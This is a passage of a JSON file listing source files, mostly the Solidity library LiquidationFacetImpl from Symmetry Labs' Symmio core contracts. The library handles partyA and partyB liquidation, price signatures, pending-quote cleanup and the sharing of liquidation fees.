priceSig.quoteIds.length;\n        }\n\n        if (quoteLayout.partyBPositionsCount[partyB][partyA] == 0) {\n            maLayout.partyBLiquidationStatus[partyB][partyA] = false;\n            maLayout.partyBLiquidationTimestamp[partyB][partyA] = 0;\n        }\n    }\n}"
    },
    {
      "filename": "symmio-core/contracts/facets/liquidation/LiquidationFacetImpl.sol",
      "content": "// SPDX-License-Identifier: SYMM-Core-Business-Source-License-1.1\n// This contract is licensed under the SYMM Core Business Source License 1.1\n// Copyright (c) 2023 Symmetry Labs AG\n// For more information, see https://docs.symm.io/legal-disclaimer/license\npragma solidity >=0.8.18;\n\nimport \"../../libraries/LibLockedValues.sol\";\nimport \"../../libraries/LibMuon.sol\";\nimport \"../../libraries/LibAccount.sol\";\nimport \"../../libraries/LibQuote.sol\";\nimport \"../../storages/MAStorage.sol\";\nimport \"../../storages/QuoteStorage.sol\";\nimport \"../../storages/MuonStorage.sol\";\nimport \"../../storages/AccountStorage.sol\";\nimport \"../../storages/SymbolStorage.sol\";\n\nlibrary LiquidationFacetImpl {\n    using LockedValuesOps for LockedValues;\n\n    function liquidatePartyA(address partyA, SingleUpnlSig memory upnlSig) internal {\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n\n        LibMuon.verifyPartyAUpnl(upnlSig, partyA);\n        int256 availableBalance = LibAccount.partyAAvailableBalanceForLiquidation(\n            upnlSig.upnl,\n            partyA\n        );\n        require(availableBalance < 0, \"LiquidationFacet: PartyA is solvent\");\n        maLayout.liquidationStatus[partyA] = true;\n        maLayout.liquidationTimestamp[partyA] = upnlSig.timestamp;\n        AccountStorage.layout().liquidators[partyA].push(msg.sender);\n    }\n\n    function setSymbolsPrice(address partyA, PriceSig memory priceSig) internal {\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n        LibMuon.verifyPrices(priceSig, partyA);\n        require(maLayout.liquidationStatus[partyA], \"LiquidationFacet: PartyA is solvent\");\n        require(\n            priceSig.timestamp <=\n                maLayout.liquidationTimestamp[partyA] + maLayout.liquidationTimeout,\n            \"LiquidationFacet: Expired signature\"\n        );\n        for (uint256 index = 0; index < priceSig.symbolIds.length; index++) {\n            accountLayout.symbolsPrices[partyA][priceSig.symbolIds[index]] = Price(\n                priceSig.prices[index],\n                maLayout.liquidationTimestamp[partyA]\n            );\n        }\n\n        int256 availableBalance = LibAccount.partyAAvailableBalanceForLiquidation(\n            priceSig.upnl,\n            partyA\n        );\n        if (accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.NONE) {\n            accountLayout.liquidationDetails[partyA] = LiquidationDetail({\n                liquidationType: LiquidationType.NONE,\n                upnl: priceSig.upnl,\n                totalUnrealizedLoss: priceSig.totalUnrealizedLoss,\n                deficit: 0,\n                liquidationFee: 0\n            });\n            if (availableBalance >= 0) {\n                uint256 remainingLf = accountLayout.lockedBalances[partyA].lf;\n                accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.NORMAL;\n                accountLayout.liquidationDetails[partyA].liquidationFee = remainingLf;\n            } else if (uint256(-availableBalance) < accountLayout.lockedBalances[partyA].lf) {\n                uint256 remainingLf = accountLayout.lockedBalances[partyA].lf -\n                    uint256(-availableBalance);\n                accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.NORMAL;\n                accountLayout.liquidationDetails[partyA].liquidationFee = remainingLf;\n            } else if (\n                uint256(-availableBalance) <=\n                accountLayout.lockedBalances[partyA].lf + accountLayout.lockedBalances[partyA].cva\n            ) {\n                uint256 deficit = uint256(-availableBalance) -\n                    accountLayout.lockedBalances[partyA].lf;\n                accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.LATE;\n                accountLayout.liquidationDetails[partyA].deficit = deficit;\n            } else {\n                uint256 deficit = uint256(-availableBalance) -\n                    accountLayout.lockedBalances[partyA].lf -\n                    accountLayout.lockedBalances[partyA].cva;\n                accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.OVERDUE;\n                accountLayout.liquidationDetails[partyA].deficit = deficit;\n            }\n            AccountStorage.layout().liquidators[partyA].push(msg.sender);\n        } else {\n            require(\n                accountLayout.liquidationDetails[partyA].upnl == priceSig.upnl &&\n                    accountLayout.liquidationDetails[partyA].totalUnrealizedLoss ==\n                    priceSig.totalUnrealizedLoss,\n                \"LiquidationFacet: Invalid upnl sig\"\n            );\n        }\n    }\n\n    function liquidatePendingPositionsPartyA(address partyA) internal {\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n        require(\n            MAStorage.layout().liquidationStatus[partyA],\n            \"LiquidationFacet: PartyA is solvent\"\n        );\n        for (uint256 index = 0; index < quoteLayout.partyAPendingQuotes[partyA].length; index++) {\n            Quote storage quote = quoteLayout.quotes[\n                quoteLayout.partyAPendingQuotes[partyA][index]\n            ];\n            if (\n                (quote.quoteStatus == QuoteStatus.LOCKED ||\n                    quote.quoteStatus == QuoteStatus.CANCEL_PENDING) &&\n                quoteLayout.partyBPendingQuotes[quote.partyB][partyA].length > 0\n            ) {\n                delete quoteLayout.partyBPendingQuotes[quote.partyB][partyA];\n                AccountStorage\n                .layout()\n                .partyBPendingLockedBalances[quote.partyB][partyA].makeZero();\n            }\n            quote.quoteStatus = QuoteStatus.LIQUIDATED;\n            quote.modifyTimestamp = block.timestamp;\n        }\n        AccountStorage.layout().pendingLockedBalances[partyA].makeZero();\n        delete quoteLayout.partyAPendingQuotes[partyA];\n    }\n\n    function liquidatePositionsPartyA(\n        address partyA,\n        uint256[] memory quoteIds\n    ) internal returns (bool) {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n\n        require(maLayout.liquidationStatus[partyA], \"LiquidationFacet: PartyA is solvent\");\n        for (uint256 index = 0; index < quoteIds.length; index++) {\n            Quote storage quote = quoteLayout.quotes[quoteIds[index]];\n            require(\n                quote.quoteStatus == QuoteStatus.OPENED ||\n                    quote.quoteStatus == QuoteStatus.CLOSE_PENDING ||\n                    quote.quoteStatus == QuoteStatus.CANCEL_CLOSE_PENDING,\n                \"LiquidationFacet: Invalid state\"\n            );\n            require(quote.partyA == partyA, \"LiquidationFacet: Invalid party\");\n            require(\n                accountLayout.symbolsPrices[partyA][quote.symbolId].timestamp ==\n                    maLayout.liquidationTimestamp[partyA],\n                \"LiquidationFacet: Price should be set\"\n            );\n            quote.quoteStatus = QuoteStatus.LIQUIDATED;\n            quote.modifyTimestamp = block.timestamp;\n\n            (bool hasMadeProfit, uint256 amount) = LibQuote.getValueOfQuoteForPartyA(\n                accountLayout.symbolsPrices[partyA][quote.symbolId].price,\n                LibQuote.quoteOpenAmount(quote),\n                quote\n            );\n            if (hasMadeProfit) {\n                accountLayout.totalUnplForLiquidation[partyA] += int256(amount);\n            } else {\n                accountLayout.totalUnplForLiquidation[partyA] -= int256(amount);\n            }\n\n            if (\n                accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.NORMAL\n            ) {\n                accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += quote\n                    .lockedValues\n                    .cva;\n                if (hasMadeProfit) {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n                } else {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += amount;\n                }\n            } else if (\n                accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.LATE\n            ) {\n                accountLayout.partyBAllocatedBalances[quote.partyB][partyA] +=\n                    quote.lockedValues.cva -\n                    ((quote.lockedValues.cva * accountLayout.liquidationDetails[partyA].deficit) /\n                        accountLayout.lockedBalances[partyA].cva);\n                if (hasMadeProfit) {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n                } else {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += amount;\n                }\n            } else if (\n                accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.OVERDUE\n            ) {\n                if (hasMadeProfit) {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n                } else {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] +=\n                        amount -\n                        ((amount * accountLayout.liquidationDetails[partyA].deficit) /\n                            uint256(-accountLayout.liquidationDetails[partyA].totalUnrealizedLoss));\n                }\n            }\n            accountLayout.partyBLockedBalances[quote.partyB][partyA].subQuote(quote);\n            quote.avgClosedPrice =\n                (quote.avgClosedPrice *\n                    quote.closedAmount +\n                    LibQuote.quoteOpenAmount(quote) *\n                    accountLayout.symbolsPrices[partyA][quote.symbolId].price) /\n                (quote.closedAmount + LibQuote.quoteOpenAmount(quote));\n            quote.closedAmount = quote.quantity;\n\n            LibQuote.removeFromOpenPositions(quote.id);\n            quoteLayout.partyAPositionsCount[partyA] -= 1;\n            quoteLayout.partyBPositionsCount[quote.partyB][partyA] -= 1;\n        }\n        if (quoteLayout.partyAPositionsCount[partyA] == 0) {\n            require(\n                quoteLayout.partyAPendingQuotes[partyA].length == 0,\n                \"LiquidationFacet: Pending quotes should be liquidated first\"\n            );\n            accountLayout.allocatedBalances[partyA] = 0;\n            accountLayout.lockedBalances[partyA].makeZero();\n\n            uint256 lf = accountLayout.liquidationDetails[partyA].liquidationFee;\n            if (lf > 0) {\n                accountLayout.allocatedBalances[accountLayout.liquidators[partyA][0]] += lf / 2;\n                accountLayout.allocatedBalances[accountLayout.liquidators[partyA][1]] += lf / 2;\n            }\n            delete accountLayout.liquidators[partyA];\n            maLayout.liquidationStatus[partyA] = false;\n            maLayout.liquidationTimestamp[partyA] = 0;\n            accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.NONE;\n            if (\n                accountLayout.totalUnplForLiquidation[partyA] !=\n                accountLayout.liquidationDetails[partyA].upnl\n            ) {\n                accountLayout.totalUnplForLiquidation[partyA] = 0;\n                return false;\n            }\n            accountLayout.totalUnplForLiquidation[partyA] = 0;\n        }\n        return true;\n    }\n\n    function liquidatePartyB(\n        address partyB,\n        address partyA,\n        SingleUpnlSig memory upnlSig\n    ) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n\n        LibMuon.verifyPartyBUpnl(upnlSig, partyB, partyA);\n        int256 availableBalance = LibAccount.partyBAvailableBalanceForLiquidation(\n            upnlSig.upnl,\n            partyB,\n            partyA\n        );\n\n        require(availableBalance < 0, \"LiquidationFacet: partyB is solvent\");\n        uint256 liquidatorShare;\n        uint256 remainingLf;\n        if (uint256(-availableBalance) < accountLayout.partyBLockedBalances[partyB][partyA].lf) {\n            remainingLf =\n                accountLayout.partyBLockedBalances[partyB][partyA].lf -\n                uint256(-availableBalance);\n            liquidatorShare = (remainingLf * maLayout.liquidatorShare) / 1e18;\n\n            maLayout.partyBPositionLiquidatorsShare[partyB][partyA] =\n                (remainingLf - liquidatorShare) /\n                quoteLayout.partyBPositionsCount[partyB][partyA];\n        } else {\n            maLayout.partyBPositionLiquidatorsShare[partyB][partyA] = 0;\n        }\n\n        maLayout.partyBLiquidationStatus[partyB][partyA] = true;\n        maLayout.partyBLiquidationTimestamp[partyB][partyA] = upnlSig.timestamp;\n\n        uint256[] storage pendingQuotes = quoteLayout.partyAPendingQuotes[partyA];\n\n        for (uint256 index = 0; index < pendingQuotes.length; ) {\n            Quote storage quote = quoteLayout.quotes[pendingQuotes[index]];\n            if (\n                quote.partyB == partyB &&\n                (quote.quoteStatus == QuoteStatus.LOCKED ||\n                    quote.quoteStatus == QuoteStatus.CANCEL_PENDING)\n            ) {\n                accountLayout.pendingLockedBalances[partyA].subQuote(quote);\n\n                pendingQuotes[index] = pendingQuotes[pendingQuotes.length - 1];\n                pendingQuotes.pop();\n                quote.quoteStatus = QuoteStatus.LIQUIDATED;\n                quote.modifyTimestamp = block.timestamp;\n            } else {\n                index++;\n            }\n        }\n        accountLayout.allocatedBalances[partyA] +=\n            accountLayout.partyBAllocatedBalances[partyB][partyA] -\n            remainingLf;\n\n        delete quoteLayout.partyBPendingQuotes[partyB][partyA];\n        accountLayout.partyBAllocatedBalances[partyB][partyA] = 0;\n        accountLayout.partyBLockedBalances[partyB][partyA].makeZero();\n        accountLayout.partyBPendingLockedBalances[partyB][partyA].makeZero();\n\n        if (liquidatorShare > 0) {\n            accountLayout.allocatedBalances[msg.sender] += liquidatorShare;\n        }\n    }\n\n    function liquidatePositionsPartyB(\n        address partyB,\n        address partyA,\n        QuotePriceSig memory priceSig\n    ) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n\n        LibMuon.verifyQuotePrices(priceSig);\n        require(\n            priceSig.timestamp <=\n                maLayout.partyBLiquidationTimestamp[partyB][partyA] + maLayout.liquidationTimeout,"
    }
  ]
}